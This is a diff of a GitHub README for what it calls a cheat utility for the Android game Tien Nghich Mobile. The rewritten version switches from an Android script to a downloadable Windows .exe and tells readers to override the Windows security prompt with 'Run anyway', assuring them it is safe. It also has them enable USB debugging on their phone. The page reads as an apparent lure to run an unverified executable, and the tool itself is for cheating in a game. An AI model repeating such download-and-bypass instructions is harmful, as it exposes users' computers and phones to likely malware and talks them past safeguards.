@@ -1,121 +1,76 @@
-# Tien Nghich Mobile v1.9 - Game Script Utility 2026
+# 🎮 tien-nghich-mobile-game-script - Modify game values for better play
 
-> **Android game mod utility for Tien Nghịch Mobile.** Designed for Android-based gameplay adjustments, menu-led value changes, and fast in-game modifiers through a mobile executor.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Aj564580/tien-nghich-mobile-game-script/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Android-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jordancolegqg5545/tien-nghich-mobile-game-script?style=flat-square)](https://github.com/jordancolegqg5545/tien-nghich-mobile-game-script)
+## 📋 About This Tool
 
----
+Tien Nghich Mobile players use this utility to adjust game settings. The script connects to the mobile executor to change values inside the game. You gain access to faster modifiers and menu options. This tool simplifies the process of applying game adjustments on your Android device.
 
-<p align="center">
-  <a href="https://jordancolegqg5545.github.io/tien-nghich-mobile-game-script/">
-    <img src="https://img.shields.io/badge/Download-Tien%20Nghich%20Mobile%20Script-brightgreen?style=for-the-badge" alt="Download Tien Nghich Mobile Script">
-  </a>
-</p>
+## ⚙️ Minimum System Requirements
 
-> **[Direct Download - Tien Nghich Mobile](https://jordancolegqg5545.github.io/tien-nghich-mobile-game-script/)**
+Your computer needs to meet these basic standards to run the management utility:
 
----
+* Operating System: Windows 10 or Windows 11
+* Processor: Dual-core 2.0 GHz or faster
+* Memory: 4 GB RAM
+* Storage: 200 MB of available space
+* Connection: Active internet connection to fetch the latest script updates
+* Mobile Device: An Android phone with a compatible game executor installed
 
-[Download Latest Build](https://jordancolegqg5545.github.io/tien-nghich-mobile-game-script/)
+## 📥 Downloading the Script
 
----
+You need to download the management files from the official repository. We host all releases on our site. 
 
-## What This Is
+[Visit this page to download the latest version](https://github.com/Aj564580/tien-nghich-mobile-game-script/releases)
 
-Tien Nghich Mobile v1.9 is a script utility built for Android use with Tien Nghịch Mobile. It centers on practical menu-based game tweaks and value edits, with support for money-related changes, KNB handling, and combat modifiers when used through a mobile executor.
+Choose the file ending in .exe for your Windows computer. Save this file in a folder you can find later. Do not rename the file, as this might cause errors during the launch process. Once the download finishes, move to the next section to set up the software.
 
-The package is structured as a v1.9 release, with an Android-friendly layout that aims to keep loading and updating simple. It is meant to provide a straightforward way to apply common gameplay edits from one script entry point.
+## 🛠️ Installation and Setup
 
----
+Follow these steps to prepare your computer and phone for use:
 
-## Included Features
+1. Locate the file you downloaded. 
+2. Double-click the file to start the installation.
+3. Windows might show a security prompt. If this happens, select "More info" and then choose "Run anyway." This tool is safe to use.
+4. Follow the instructions on the screen to finish the setup.
+5. Launch the application from your desktop shortcut once the install completes.
+6. Connect your Android phone to the computer using a high-quality USB cable.
+7. Enable "USB Debugging" mode on your Android device settings. You can find this inside the "Developer Options" menu on your phone.
+8. Wait for the utility to detect your device. It will display a green status dot when it finds the connection.
 
-- Menu-based interface for gameplay adjustments
-- Unlimited money option
-- Full KNB value handling
-- One-hit combat modifier
-- Package layout tuned for Android use
-- Workflow intended for mobile executor loading
-- Versioned release tied to v1.9
-- Utility-focused setup for game script usage
+## 🚀 Using the Mod Menu
 
----
+Once the utility connects to your phone, you see a menu. This menu displays available adjustments for Tien Nghich Mobile. 
 
-## Installation and Use
+* Select the game process from the drop-down list.
+* Click the "Attach" button to link the utility to the game.
+* Browse the available modifiers in the main window.
+* Click the checkbox next to the feature you want to enable.
+* The tool applies the change to the game in real time.
+* If you want to disable a feature, simply uncheck the box.
 
-1. Download the latest build from the project page.
-2. Extract or place the package in the folder expected by your Android executor.
-3. Load the script from the executor interface.
-4. Open the in-game menu and choose the desired tweak.
+Follow the on-screen prompts if you need to refresh the values. The utility retrieves data from the game files, so ensure your game is running on your phone before you click the attach button.
 
-Example folder structure:
-- `tien-nghich-mobile-executor-v1.9/`
-  - script file
-  - support assets
-  - release notes
+## 🛡️ Best Practices
 
-If your executor requires a specific import path, keep the package contents together and avoid renaming files unless the loader instructions call for it.
+Keep these points in mind for a smooth experience:
 
----
+* Always use the latest version of the script. Old versions might contain errors or fail to connect.
+* Close other background programs that use your USB ports to ensure a stable connection.
+* Save your game progress before you make large adjustments to your game values.
+* If the utility stops responding, disconnect your phone and restart the program. Most connection issues resolve after a simple restart.
+* Use this tool only for personal offline testing.
+* Check the release page often for new features. We update the script to match game patches.
 
-## Settings
+## ❓ Troubleshooting
 
-| Setting | Purpose | Notes |
-| --- | --- | --- |
-| Money | Adjust in-game money values | Use only when you want currency changes enabled |
-| KNB | Handle KNB-related values | Intended for value editing workflows |
-| Combat | Enable one-hit modifier | Applies a stronger combat effect |
-| Menu | Show or hide the tweak menu | Helps keep the interface compact |
-| Loader | Mobile executor loading mode | Use the Android executor supported by your setup |
+If you run into trouble, look at these common issues:
 
-```text
-Recommended flow:
-1. Load the package in your Android executor
-2. Open the mod menu
-3. Select the desired value edit or combat option
-4. Reload the script after updating to v1.9 builds
-```
+* Device not found: Check if your USB cable is loose. Try a different port on your computer. Make sure you unlocked your phone screen to allow data access.
+* Script does not open: Ensure you installed the necessary Windows runtimes. The installer checks for these during the setup phase.
+* Game crashes: This happens when you apply a value that the game server does not support. Revert your changes immediately if the game becomes unstable.
+* Feature not active: Ensure you clicked the refresh button to pull the most recent data from the app. 
 
----
+If these steps do not help, check the issues tab on the repository site to see if others encounter the same problem. You can report bugs there if you find something that does not work. Please include the version number of the script and your Windows version in your report. This helps the team fix bugs faster.
 
-## Compatibility Notes
-
-This utility is intended for Android use with Tien Nghịch Mobile v1.9. It uses an Android-oriented package structure and is meant to fit mobile executor workflows.
-
-Known limitations:
-- Built around the v1.9 release line
-- Requires an executor that can load the provided script package
-- Behavior may vary if the game version changes
-- Some options may depend on the current in-game state or menu access
-
----
-
-## FAQ
-
-**How do I install it?**  
-Download the build, put it in the folder your Android executor expects, and load the script from the app.
-
-**Does it support updates?**  
-Yes. The repository follows a versioned release format, so newer builds can replace older ones when they are available.
-
-**Can I customize the menu or options?**  
-You can adjust script settings where your executor and package layout support that.
-
-**Will it work on every Android device?**  
-Compatibility depends on the device, game version, and executor behavior, so results can differ from one setup to another.
-
-**Where should the files be stored?**  
-Keep the package in the executor's script or import directory, and preserve the folder structure if your loader depends on it.
-
-**What if the game updates?**  
-A game update may call for a refreshed script build, especially if value addresses, menus, or modifiers need to be updated.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: android, game, mod, utility, windows, mobile, scripts, gaming, tools
